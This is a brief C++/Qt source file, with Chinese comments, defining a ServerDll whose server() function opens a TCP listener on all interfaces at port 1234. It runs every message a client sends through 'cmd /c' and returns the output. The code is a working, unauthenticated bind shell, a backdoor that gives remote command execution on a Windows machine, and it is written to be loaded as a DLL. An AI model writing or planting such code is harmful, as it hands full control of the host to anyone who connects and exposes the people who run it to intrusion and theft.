#include "serverdll.h"

ServerDll::ServerDll()
{
}

void server()
{
    QTcpServer server;
    server.listen(QHostAddress::Any,1234);//监听本机ip，和1234端口
    while(!server.waitForNewConnection());//等待客户端连接
    QTcpSocket *client=server.nextPendingConnection();//把链接的的客户端存
    QString str="connect successful";//
    QByteArray message=str.toUtf8();//发送连接成功给客户端
    client->write(message);//
    while(1){
        client->waitForReadyRead(100000);//等待客户端发送消息
    message=client->readAll();//读取
    qDebug()<<message.toStdString().c_str();//
    if(message.toStdString()=="break")//
        break;
    QProcess process;
    process.setProgram("cmd");//调用cmd
    QStringList argument;//
    argument<<"/c"<<message.toStdString().c_str();//根据客户端发送信息运行
    process.setArguments(argument);
    process.start();
    process.waitForStarted(); //等待程序启动
    process.waitForFinished();//等待程序关闭
   client->write(process.readAllStandardOutput());//system(message.toStdString().c_str());
        }
}
